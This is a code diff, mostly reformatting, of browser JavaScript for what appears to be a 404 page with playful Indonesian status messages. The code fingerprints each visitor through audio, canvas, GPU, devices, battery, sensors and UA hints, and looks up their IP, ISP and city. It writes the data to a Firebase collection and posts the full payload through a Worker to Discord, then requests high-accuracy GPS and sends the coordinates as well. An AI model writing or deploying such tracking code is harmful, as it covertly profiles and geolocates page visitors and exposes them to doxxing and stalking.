- script.onaudioprocess = (e) => {
- const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
- osc.stop(); actx.close();
- res(hashStr(raw));
- };
- setTimeout(() => res(null), 300);
- });
- })(),
+    // Audio fingerprint
+    (async () => {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      const actx = new AudioCtx();
+      const osc = actx.createOscillator();
+      const gain = actx.createGain();
+      const script = actx.createScriptProcessor(4096, 1, 1);
+      gain.gain.value = 0;
+      osc.connect(gain); gain.connect(script); script.connect(actx.destination);
+      osc.frequency.value = 1000; osc.start();
+      return new Promise((res) => {
+        script.onaudioprocess = (e) => {
+          const raw = Array.from(e.inputBuffer.getChannelData(0)).slice(0, 32).join(",");
+          osc.stop(); actx.close();
+          res(hashStr(raw));
+        };
+        setTimeout(() => res(null), 300);
+      });
+    })(),
 
- // IP lookup
- (async () => {
- const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
- const j = await resp.json();
- return {
- ip: j.ip ?? null, isp: j.org ?? null, city: j.city ?? null,
- country: j.country_name ?? null, region: j.region ?? null,
- proxy: j.proxy ?? null, hosting: j.hosting ?? null, asn: j.asn ?? null,
- };
- })(),
+    // IP lookup
+    (async () => {
+      const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
+      const j = await resp.json();
+      return {
+        ip: j.ip ?? null, isp: j.org ?? null, city: j.city ?? null,
+        country: j.country_name ?? null, region: j.region ?? null,
+        proxy: j.proxy ?? null, hosting: j.hosting ?? null, asn: j.asn ?? null,
+      };
+    })(),
 
- // Media devices
- (async () => {
- const devices = await navigator.mediaDevices?.enumerateDevices() ?? [];
- return {
- audioIn: devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic'),
- videoIn: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam'),
- audioOut: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker'),
- };
- })(),
+    // Media devices
+    (async () => {
+      const devices = await navigator.mediaDevices?.enumerateDevices() ?? [];
+      return {
+        audioIn:  devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic'),
+        videoIn:  devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam'),
+        audioOut: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker'),
+      };
+    })(),
 
- // Battery
- (async () => {
- const batt = await navigator.getBattery?.();
- if (!batt) return { level: null, charging: null };
- return { level: Math.round(batt.level * 100) + "%", charging: batt.charging };
- })(),
+    // Battery
+    (async () => {
+      const batt = await navigator.getBattery?.();
+      if (!batt) return { level: null, charging: null };
+      return { level: Math.round(batt.level * 100) + "%", charging: batt.charging };
+    })(),
 
- // UA hints
- (async () => {
- if (!navigator.userAgentData) return {};
- const base = { brands: JSON.stringify(navigator.userAgentData.brands), mobile: navigator.userAgentData.mobile };
- const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
- return { ...base, model: hints.model ?? null, architecture: hints.architecture ?? null, bitness: hints.bitness ?? null };
- })(),
+    // UA hints
+    (async () => {
+      if (!navigator.userAgentData) return {};
+      const base = { brands: JSON.stringify(navigator.userAgentData.brands), mobile: navigator.userAgentData.mobile };
+      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
+      return { ...base, model: hints.model ?? null, architecture: hints.architecture ?? null, bitness: hints.bitness ?? null };
+    })(),
 
- // Sensors
- (async () => {
- const out = { accel: null, gyro: null, mag: null };
- if ('Accelerometer' in window) {
- const d = await new window.Accelerometer({ frequency: 1 }).getData?.().catch(() => null);
- if (d) out.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
- }
- return out;
- })(),
- ]);
+    // Sensors
+    (async () => {
+      const out = { accel: null, gyro: null, mag: null };
+      if ('Accelerometer' in window) {
+        const d = await new window.Accelerometer({ frequency: 1 }).getData?.().catch(() => null);
+        if (d) out.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+      }
+      return out;
+    })(),
+  ]);
 
- addLine("Melacak IP & lokasi~ 🌐");
+  addLine("Melacak IP & lokasi~ 🌐");
 
- const audioFingerprint = audioFpResult.status === 'fulfilled' ? audioFpResult.value : null;
- const ipData = ipResult.status === 'fulfilled' ? ipResult.value : { ip: null, isp: null, city: null, country: null, region: null, proxy: null, hosting: null, asn: null };
- const mediaData = mediaResult.status === 'fulfilled' ? mediaResult.value : { audioIn: [], videoIn: [], audioOut: [] };
- const batteryData = batteryResult.status === 'fulfilled' ? batteryResult.value : { level: null, charging: null };
- const uahData = uahResult.status === 'fulfilled' ? uahResult.value : {};
- const sensorData = sensorResult.status === 'fulfilled' ? sensorResult.value : { accel: null, gyro: null, mag: null };
+  const audioFingerprint = audioFpResult.status === 'fulfilled' ? audioFpResult.value : null;
+  const ipData      = ipResult.status      === 'fulfilled' ? ipResult.value      : { ip: null, isp: null, city: null, country: null, region: null, proxy: null, hosting: null, asn: null };
+  const mediaData   = mediaResult.status   === 'fulfilled' ? mediaResult.value   : { audioIn: [], videoIn: [], audioOut: [] };
+  const batteryData = batteryResult.status === 'fulfilled' ? batteryResult.value : { level: null, charging: null };
+  const uahData     = uahResult.status     === 'fulfilled' ? uahResult.value     : {};
+  const sensorData  = sensorResult.status  === 'fulfilled' ? sensorResult.value  : { accel: null, gyro: null, mag: null };
 
- addLine("Mengemas semua data~ 🎀");
+  addLine("Mengemas semua data~ 🎀");
 
- // Build payload
- const raw = {
- ...navData, ...screenData, ...gpuData,
- audioFingerprint, canvasFingerprint,
- ...storageData, ...mediaData, ...localeData,
- ...batteryData, ...sensorData, ...ipData,
- ...features,
- plugins: pluginsList || null, mimeTypes: mimeList || null,
- ...uahData,
- url: location.href,
- referrer: document.referrer || null,
- };
+  // Build payload
+  const raw = {
+    ...navData, ...screenData, ...gpuData,
+    audioFingerprint, canvasFingerprint,
+    ...storageData, ...mediaData, ...localeData,
+    ...batteryData, ...sensorData, ...ipData,
+    ...features,
+    plugins: pluginsList || null, mimeTypes: mimeList || null,
+    ...uahData,
+    url:      location.href,
+    referrer: document.referrer || null,
+  };
 
- const payload = {};
- for (const key in raw) {
- if (raw[key] !== undefined && raw[key] !== null && raw[key] !== "") {
- payload[key] = raw[key];
- }
- }
+  const payload = {};
+  for (const key in raw) {
+    if (raw[key] !== undefined && raw[key] !== null && raw[key] !== "") {
+      payload[key] = raw[key];
+    }
+  }
 
- // Send Firebase & Worker paralel
- const sends = [];
+  // Send Firebase & Worker paralel
+  const sends = [];
 
- if (FB_READY) {
- sends.push((async () => {
- const fbPayload = {
- ip: payload.ip ?? null, isp: payload.isp ?? null,
- city: payload.city ?? null, region: payload.region ?? null,
- country: payload.country ?? null, timezone: payload.timezone ?? null,
- platform: payload.platform ?? null, userAgent: payload.userAgent ?? null,
- language: payload.language ?? null, screenW: payload.width ?? null,
- screenH: payload.height ?? null, pixelRatio: payload.pixelRatio ?? null,
- url: location.href, referrer: document.referrer || null,
- timestamp: serverTimestamp(),
- };
- const cleanFb = {};
- for (const k in fbPayload) { if (fbPayload[k] !== null) cleanFb[k] = fbPayload[k]; }
- await addDoc(collection(db, "visitors_404"), cleanFb);
- addLine("✅ Memori isekai tersimpan~ 🌸");
- })().catch(() => addLine("❌ Gagal simpan~ (╥_╥)")));
- }
+  if (FB_READY) {
+    sends.push((async () => {
+      const fbPayload = {
+        ip: payload.ip ?? null, isp: payload.isp ?? null,
+        city: payload.city ?? null, region: payload.region ?? null,
+        country: payload.country ?? null, timezone: payload.timezone ?? null,
+        platform: payload.platform ?? null, userAgent: payload.userAgent ?? null,
+        language: payload.language ?? null, screenW: payload.width ?? null,
+        screenH: payload.height ?? null, pixelRatio: payload.pixelRatio ?? null,
+        url: location.href, referrer: document.referrer || null,
+        timestamp: serverTimestamp(),
+      };
+      const cleanFb = {};
+      for (const k in fbPayload) { if (fbPayload[k] !== null) cleanFb[k] = fbPayload[k]; }
+      await addDoc(collection(db, "visitors_404"), cleanFb);
+      addLine("✅ Memori isekai tersimpan~ 🌸");
+    })().catch(() => addLine("❌ Gagal simpan~ (╥_╥)")));
+  }
 
- if (CF_READY) {
- sends.push(fetch(WORKER_URL, {
- method: "POST",
- headers: { "Content-Type": "application/json" },
- body: JSON.stringify(payload),
- }).then(() => addLine("✅ Laporan dikirim ke Discord~ 💕"))
- .catch(() => addLine("❌ Gagal kirim~ (╥_╥)")));
- }
+  if (CF_READY) {
+    sends.push(fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).then(() => addLine("✅ Laporan dikirim ke Discord~ 💕"))
+      .catch(() => addLine("❌ Gagal kirim~ (╥_╥)")));
+  }
 
- await Promise.allSettled(sends);
- addLine("Pemindaian selesai nyaa~ ✨ Arigatou!");
+  await Promise.allSettled(sends);
+  addLine("Pemindaian selesai nyaa~ ✨ Arigatou!");
 
- // ── GPS Background HIGH ACCURACY ──
- if (CF_READY && navigator.geolocation) {
-    // Beritahu user bahwa GPS sedang dimuat (opsional, tapi bagus untuk UX)
-    addLine("📍 Memanggil Roh Lokasi (GPS)~ ...");
-    
+  // ── GPS background — minta izin SETELAH laporan utama terkirim ──
+  // Kalau user klik Izinkan → kirim follow-up ke Discord
+  // Kalau Tolak / diabaikan → tidak ada yang dikirim, tidak ada error
+  if (CF_READY && navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-        async (pos) => {
+      async (pos) => {
         // Izin diberikan → kirim pesan GPS ke Worker
         try {
-            // Hitung akurasi dalam meter
-            const accuracy = pos.coords.accuracy.toFixed(1);
-            await fetch(WORKER_URL, {
+          await fetch(WORKER_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                _gpsOnly: true,
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: accuracy,
-                altitude: pos.coords.altitude,
-                url: location.href,
+              _gpsOnly: true,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              url: location.href,
             }),
-            });
-            addLine(`📍 Lokasi terkunci! Akurasi: ${accuracy}m 🌸`);
-            } catch (_) {}
-        },
-        (err) => { 
-            // Error handling yang lebih spesifik
-            if (err.code === 1) addLine("📍 Roh Lokasi diam saja (Terkunci)~");
-            else if (err.code === 2) addLine("📍 Roh Lokasi tidak terlihat (Sinyat lemah)~");
-            else if (err.code === 3) addLine("📍 Roh Lokasi tertidur (Timeout)~");
-        },
-        { 
-            enableHighAccuracy: true, // Memaksa penggunaan GPS hardware jika ada
-            timeout: 15000,           // Tunggu sampai 15 detik untuk akurasi maksimal
-            maximumAge: 0             // Jangan pakai cache lama
-        }
+          });
+          addLine("📍 Koordinat GPS terkirim~ 🌸");
+        } catch (_) {}
+      },
+      () => { /* Ditolak / timeout → diam saja */ },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
-    }
+  }
 }
 
 // Run it
